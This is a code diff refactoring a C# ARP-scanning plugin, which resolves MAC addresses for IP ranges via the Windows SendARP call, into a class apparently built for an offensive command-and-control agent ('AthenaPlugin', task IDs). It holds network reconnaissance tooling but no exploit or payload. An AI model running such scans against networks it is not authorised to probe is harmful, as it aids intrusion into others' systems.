@@ -2,26 +2,24 @@
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.RegularExpressions;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class arp
+    public class Plugin : AthenaPlugin
     {
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref uint PhyAddrLen);
 
         private static uint macAddrLen = (uint)new byte[6].Length;
         private const string separator = "|";
-        private static List<string> macList = new List<string>();
 
-        private static string MacAddresstoString(byte[] macAdrr)
+        private string MacAddresstoString(byte[] macAdrr)
         {
             string macString = BitConverter.ToString(macAdrr);
             return macString.ToUpper();
         }
 
-        private static string ThreadedARPRequest(string ipString)
+        private string ThreadedARPRequest(string ipString)
         {
             IPAddress ipAddress;
             byte[] macAddr = new byte[6];
@@ -43,7 +41,7 @@ namespace Plugin
             return "";
         }
 
-        public static void CheckStatus(IPAddressCollection ipList, int timeout, string task_id)
+        public void CheckStatus(IPAddressCollection ipList, int timeout, string task_id)
         {
             List<Tuple<string, string, string>> result = new List<Tuple<string, string, string>>();
             byte[] macAddr = new byte[6];
@@ -64,8 +62,7 @@ namespace Plugin
             }
             Thread.Sleep(timeout);
         }
-
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
